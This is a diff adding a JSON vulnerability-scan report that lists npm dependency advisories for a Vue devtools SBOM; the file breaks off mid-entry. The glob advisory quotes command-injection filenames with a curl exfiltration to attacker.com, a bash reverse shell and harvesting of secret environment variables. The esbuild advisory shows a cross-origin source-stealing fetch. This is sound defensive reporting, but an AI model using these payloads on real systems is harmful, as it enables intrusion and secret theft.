@@ -1,0 +1,1935 @@
+{
+  "results": [
+    {
+      "source": {
+        "path": "/sboms/vuejs__devtools.spdx.json",
+        "type": "sbom"
+      },
+      "packages": [
+        {
+          "package": {
+            "name": "cross-spawn",
+            "version": "5.1.0",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-3xgq-45jj-v275"
+              ],
+              "aliases": [
+                "CVE-2024-21538",
+                "GHSA-3xgq-45jj-v275"
+              ],
+              "max_severity": "7.7"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-3xgq-45jj-v275/GHSA-3xgq-45jj-v275.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "cross-spawn",
+                    "purl": "pkg:npm/cross-spawn"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "7.0.0"
+                        },
+                        {
+                          "fixed": "7.0.5"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-3xgq-45jj-v275/GHSA-3xgq-45jj-v275.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "cross-spawn",
+                    "purl": "pkg:npm/cross-spawn"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "6.0.6"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2024-21538"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1333"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-11-15T22:25:53Z",
+                "nvd_published_at": "2024-11-08T05:15:06Z",
+                "severity": "HIGH"
+              },
+              "details": "Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.",
+              "id": "GHSA-3xgq-45jj-v275",
+              "modified": "2025-05-19T19:56:26Z",
+              "published": "2024-11-08T06:30:47Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-21538"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/moxystudio/node-cross-spawn/issues/165"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/moxystudio/node-cross-spawn/pull/160"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/moxystudio/node-cross-spawn"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230"
+                }
+              ],
+              "related": [
+                "CGA-3wmj-q542-x56g",
+                "CGA-49x5-fp72-pvgg",
+                "CGA-56f7-wq2j-gqhc",
+                "CGA-58mw-hm95-x9xv",
+                "CGA-7c7p-r8cv-2pj4",
+                "CGA-8hpc-g49m-34cc",
+                "CGA-8j64-28x2-ggxv",
+                "CGA-8rv2-6965-grc6",
+                "CGA-m347-mh8c-rhf4"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Regular Expression Denial of Service (ReDoS) in cross-spawn"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "esbuild",
+            "version": "0.21.5",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-67mh-4wv8-2f99"
+              ],
+              "aliases": [
+                "GHSA-67mh-4wv8-2f99"
+              ],
+              "max_severity": "5.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 0.24.2",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/02/GHSA-67mh-4wv8-2f99/GHSA-67mh-4wv8-2f99.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "esbuild",
+                    "purl": "pkg:npm/esbuild"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.25.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-346"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-02-10T17:48:07Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e =\u003e console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r =\u003e r.text()).then(content =\u003e console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+              "id": "GHSA-67mh-4wv8-2f99",
+              "modified": "2025-02-10T17:48:08Z",
+              "published": "2025-02-10T17:48:07Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/evanw/esbuild"
+                }
+              ],
+              "related": [
+                "CGA-4v28-58cf-ggx7",
+                "CGA-5qqq-3383-mhjr",
+                "CGA-75rh-2q2q-wm52",
+                "CGA-m983-9xr3-349j",
+                "CGA-mhg6-chj9-5v88",
+                "CGA-rjff-7jch-vw6j",
+                "CGA-w25f-r54p-vh94"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "esbuild enables any website to send any requests to the development server and read the response"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "glob",
+            "version": "10.4.5",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-5j98-mcp5-4vw2"
+              ],
+              "aliases": [
+                "CVE-2025-64756",
+                "GHSA-5j98-mcp5-4vw2"
+              ],
+              "max_severity": "7.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-5j98-mcp5-4vw2/GHSA-5j98-mcp5-4vw2.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "glob",
+                    "purl": "pkg:npm/glob"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "11.0.0"
+                        },
+                        {
+                          "fixed": "11.1.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-5j98-mcp5-4vw2/GHSA-5j98-mcp5-4vw2.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "glob",
+                    "purl": "pkg:npm/glob"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "10.2.0"
+                        },
+                        {
+                          "fixed": "10.5.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-64756"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-78"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-11-17T17:38:56Z",
+                "nvd_published_at": "2025-11-17T18:15:58Z",
+                "severity": "HIGH"
+              },
+              "details": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c \u003ccommand\u003e \u003cpatterns\u003e` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () =\u003e foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c \u003ccommand\u003e \u003cpattern\u003e` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `\u0026`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory \u0026\u0026 cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" \u003e /dev/null 2\u003e\u00261)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" \u003e /dev/null 2\u003e\u00261)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i \u003e\u0026 /dev/tcp/attacker.com/4444 0\u003e\u00261)\ntouch '$(bash -i \u003e\u0026 /dev/tcp/attacker.com/4444 0\u003e\u00261)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" \u003e /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" \u003e /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
+              "id": "GHSA-5j98-mcp5-4vw2",
+              "modified": "2025-11-19T02:30:52Z",
+              "published": "2025-11-17T17:38:56Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64756"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/isaacs/node-glob"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "glob CLI: Command injection via -c/--cmd executes matches with shell:true"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "js-yaml",
+            "version": "3.14.1",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-mh29-5h37-fv8m"
+              ],
+              "aliases": [
+                "CVE-2025-64718",
+                "GHSA-mh29-5h37-fv8m"
+              ],
+              "max_severity": "5.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-mh29-5h37-fv8m/GHSA-mh29-5h37-fv8m.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "js-yaml",
+                    "purl": "pkg:npm/js-yaml"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.1.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-mh29-5h37-fv8m/GHSA-mh29-5h37-fv8m.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "js-yaml",
+                    "purl": "pkg:npm/js-yaml"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.14.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-64718"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1321"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-11-14T14:29:48Z",
+                "nvd_published_at": "2025-11-13T16:15:57Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+              "id": "GHSA-mh29-5h37-fv8m",
+              "modified": "2025-11-17T15:20:43Z",
+              "published": "2025-11-14T14:29:48Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64718"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/nodeca/js-yaml"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "js-yaml has prototype pollution in merge (\u003c\u003c)"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "js-yaml",
+            "version": "4.1.0",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-mh29-5h37-fv8m"
+              ],
+              "aliases": [
+                "CVE-2025-64718",
+                "GHSA-mh29-5h37-fv8m"
+              ],
+              "max_severity": "5.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-mh29-5h37-fv8m/GHSA-mh29-5h37-fv8m.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "js-yaml",
+                    "purl": "pkg:npm/js-yaml"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.1.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-mh29-5h37-fv8m/GHSA-mh29-5h37-fv8m.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "js-yaml",
+                    "purl": "pkg:npm/js-yaml"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.14.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-64718"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1321"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-11-14T14:29:48Z",
+                "nvd_published_at": "2025-11-13T16:15:57Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+              "id": "GHSA-mh29-5h37-fv8m",
+              "modified": "2025-11-17T15:20:43Z",
+              "published": "2025-11-14T14:29:48Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64718"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/nodeca/js-yaml"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "js-yaml has prototype pollution in merge (\u003c\u003c)"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "mdast-util-to-hast",
+            "version": "13.2.0",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-4fh9-h7wg-q85m"
+              ],
+              "aliases": [
+                "CVE-2025-66400",
+                "GHSA-4fh9-h7wg-q85m"
+              ],
+              "max_severity": "6.9"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-4fh9-h7wg-q85m/GHSA-4fh9-h7wg-q85m.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "mdast-util-to-hast",
+                    "purl": "pkg:npm/mdast-util-to-hast"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "13.0.0"
+                        },
+                        {
+                          "fixed": "13.2.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-66400"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-20",
+                  "CWE-915"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-12-02T01:25:46Z",
+                "nvd_published_at": "2025-12-01T23:15:53Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Impact\n\nMultiple (unprefixed) classnames could be added in markdown source by using character references.\nThis could make rendered user supplied markdown `code` elements appear like the rest of the page.\nThe following markdown:\n\n````markdown\n```js\u0026#x20;xss\n```\n````\n\nWould create `\u003cpre\u003e\u003ccode class=\"language-js xss\"\u003e\u003c/code\u003e\u003c/pre\u003e`\nIf your page then applied `.xss` classes (or listeners in JS), those apply to this element.\nFor more info see \u003chttps://github.com/ChALkeR/notes/blob/master/Improper-markup-sanitization.md#unsanitized-class-attribute\u003e\n\n### Patches\n\nThe bug was patched. When using regular semver, run `npm install`. For exact ranges, make sure to use `13.2.1`.\n\n### Workarounds\n\nUpdate.\n\n### References\n\n* bug introduced in https://github.com/syntax-tree/mdast-util-to-hast/commit/6fc783ae6abdeb798fd5a68e7f3f21411dde7403\n* bug fixed in https://github.com/syntax-tree/mdast-util-to-hast/commit/ab3a79570a1afbfa7efef5d4a0cd9b5caafbc5d7",
+              "id": "GHSA-4fh9-h7wg-q85m",
+              "modified": "2025-12-02T01:59:16.175729Z",
+              "published": "2025-12-02T01:25:46Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/syntax-tree/mdast-util-to-hast/security/advisories/GHSA-4fh9-h7wg-q85m"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66400"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/syntax-tree/mdast-util-to-hast/commit/6fc783ae6abdeb798fd5a68e7f3f21411dde7403"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/syntax-tree/mdast-util-to-hast/commit/ab3a79570a1afbfa7efef5d4a0cd9b5caafbc5d7"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/syntax-tree/mdast-util-to-hast"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "mdast-util-to-hast has unsanitized class attribute"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "node-forge",
+            "version": "1.3.1",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-554w-wpv2-vw27"
+              ],
+              "aliases": [
+                "CVE-2025-66031",
+                "GHSA-554w-wpv2-vw27"
+              ],
+              "max_severity": "8.7"
+            },
+            {
+              "ids": [
+                "GHSA-5gfm-wpxj-wjgq"
+              ],
+              "aliases": [
+                "CVE-2025-12816",
+                "GHSA-5gfm-wpxj-wjgq"
+              ],
+              "max_severity": "8.7"
+            },
+            {
+              "ids": [
+                "GHSA-65ch-62r8-g69g"
+              ],
+              "aliases": [
+                "CVE-2025-66030",
+                "GHSA-65ch-62r8-g69g"
+              ],
+              "max_severity": "6.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-554w-wpv2-vw27/GHSA-554w-wpv2-vw27.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "node-forge",
+                    "purl": "pkg:npm/node-forge"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.3.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-66031"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-674"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-11-26T22:08:37Z",
+                "nvd_published_at": null,
+                "severity": "HIGH"
+              },
+              "details": "### Summary\n\nAn Uncontrolled Recursion (CWE-674) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft deep ASN.1 structures that trigger unbounded recursive parsing. This leads to a Denial-of-Service (DoS) via stack exhaustion when parsing untrusted DER inputs.\n\n### Details\n\nAn ASN.1 Denial of Service (Dos) vulnerability exists in the node-forge `asn1.fromDer` function within `forge/lib/asn1.js`. The ASN.1 DER parser implementation (`_fromDer`) recurses for every constructed ASN.1 value (SEQUENCE, SET, etc.) and lacks a guard limiting recursion depth. An attacker can craft a small DER blob containing a very large nesting depth of constructed TLVs which causes the Node.js V8 engine to exhaust its call stack and throw `RangeError: Maximum call stack size exceeded`, crashing or incapacitating the process handling the parse. This is a remote, low-cost Denial-of-Service against applications that parse untrusted ASN.1 objects.\n\n### Impact\n\nThis vulnerability enables an unauthenticated attacker to reliably crash a server or client using node-forge for TLS connections or certificate parsing.\n\nThis vulnerability impacts the ans1.fromDer function in `node-forge` before patched version `1.3.2`. \n\nAny downstream application using this component is impacted. These components may be leveraged by downstream applications in ways that enable full compromise of availability.",
+              "id": "GHSA-554w-wpv2-vw27",
+              "modified": "2025-11-26T22:42:00.208887Z",
+              "published": "2025-11-26T22:08:37Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/digitalbazaar/forge/security/advisories/GHSA-554w-wpv2-vw27"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/digitalbazaar/forge/commit/260425c6167a38aae038697132483b5517b26451"
+                },
+                {
